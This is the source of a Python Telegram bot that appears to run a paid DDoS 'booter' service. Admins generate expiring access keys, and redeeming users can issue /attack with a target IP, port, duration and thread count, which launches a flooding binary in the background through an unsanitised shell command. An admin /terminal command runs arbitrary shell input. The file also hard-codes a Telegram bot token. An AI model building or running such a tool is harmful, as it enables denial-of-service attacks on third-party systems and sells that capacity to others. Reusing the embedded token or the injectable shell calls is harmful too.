import asyncio
import logging
import random
import re
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, types, executor
from aiogram.types import ParseMode, ReplyKeyboardMarkup, KeyboardButton

API_TOKEN = '7327182448:AAFE30ZzrK9TNusSbMyb6eF0jn3evUtF-DI'
ADMIN_ID = 5879359815

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

allowed_keys = {}
used_keys = set()
allowed_users = set()
default_threads = 1000
max_time = 240

def parse_duration(duration_str):
    days = hours = 0
    matches = re.findall(r'(\d+)([dh])', duration_str.lower())
    for amount, unit in matches:
        if unit == 'd':
            days += int(amount)
        elif unit == 'h':
            hours += int(amount)
    return timedelta(days=days, hours=hours)

def generate_key(duration_str="1d"):
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    expiry = datetime.now() + parse_duration(duration_str)
    allowed_keys[key] = expiry
    return key, expiry

owner_keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
owner_keyboard.add(
    KeyboardButton("/start"),
    KeyboardButton("/attack"),
    KeyboardButton("/generatekey"),
    KeyboardButton("/redeem"),
    KeyboardButton("/setthreads"),
    KeyboardButton("/setmaxtime"),
    KeyboardButton("/terminal")
)

user_keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
user_keyboard.add(
    KeyboardButton("/start"),
    KeyboardButton("/attack"),
    KeyboardButton("/redeem")
)

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("Welcome Admin! Choose an option:", reply_markup=owner_keyboard)
    else:
        await message.answer("Welcome User! Choose an option:", reply_markup=user_keyboard)

@dp.message_handler(commands=['generatekey', 'genkey'])
async def cmd_generate_key(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ You are not authorized.")

    args = message.get_args().strip()
    if not args:
        return await message.reply("❌ Use like: /generatekey 1d or 4h or 2d5h")

    try:
        key, expiry = generate_key(args)
        await message.reply(
            f"✅ Key Generated:\n`{key}`\n⏳ Valid Till: `{expiry.strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception:
        await message.reply("❌ Invalid format! Use: `/generatekey 1d4h`", parse_mode=ParseMode.MARKDOWN)

@dp.message_handler(commands=['redeem'])
async def cmd_redeem(message: types.Message):
    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /redeem <key>")
    key = args[1]

    if key in used_keys:
        return await message.reply("❌ Key already used.")

    expiry = allowed_keys.get(key)
    if not expiry:
        return await message.reply("❌ Invalid key.")

    if datetime.now() > expiry:
        allowed_keys.pop(key, None)
        return await message.reply("❌ Key expired.")

    used_keys.add(key)
    allowed_keys.pop(key, None)
    allowed_users.add(message.from_user.id)
    await message.reply("✅ Key redeemed. You now have access.")

@dp.message_handler(commands=['attack'])
async def cmd_attack(message: types.Message):
    if message.from_user.id != ADMIN_ID and message.from_user.id not in allowed_users:
        return await message.reply("⛔ Access Denied")

    args = message.text.split()
    if len(args) < 4:
        return await message.reply("Usage: /attack <ip> <port> <time> [threads]")

    ip, port = args[1], args[2]
    try:
        time_sec = int(args[3])
        if time_sec > max_time:
            return await message.reply(f"❌ Max attack time is {max_time} seconds.")
        threads = int(args[4]) if len(args) > 4 else default_threads
    except ValueError:
        return await message.reply("❌ Invalid time or threads format.")

    cmd = f"nohup ./smokey {ip} {port} {time_sec} {threads} 1 > /dev/null 2>&1 &"
    proc = await asyncio.create_subprocess_shell(cmd)
    await proc.communicate()

    await message.reply(f"🚀 Attack started on {ip}:{port} for {time_sec}s with {threads} threads.")

@dp.message_handler(commands=['setthreads'])
async def cmd_set_threads(message: types.Message):
    global default_threads
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /setthreads <number>")
    try:
        default_threads = int(args[1])
        await message.reply(f"✅ Threads set to {default_threads}")
    except ValueError:
        await message.reply("❌ Invalid number.")

@dp.message_handler(commands=['setmaxtime'])
async def cmd_set_maxtime(message: types.Message):
    global max_time
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /setmaxtime <seconds>")
    try:
        max_time = int(args[1])
        await message.reply(f"✅ Max time set to {max_time} seconds")
    except ValueError:
        await message.reply("❌ Invalid number.")

@dp.message_handler(commands=['terminal'])
async def cmd_terminal(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")

    cmd = message.text.replace("/terminal", "").strip()
    if not cmd:
        return await message.reply("Usage: /terminal <command>")

    try:
        proc = await asyncio.create_subprocess_shell(cmd)
        stdout, stderr = await proc.communicate()
        output = stdout.decode() if stdout else ""
        if not output:
            output = stderr.decode() if stderr else "No output."
        await message.reply(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await message.reply(f"❌ Error:\n{e}")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    executor.start_polling(dp, skip_updates=True)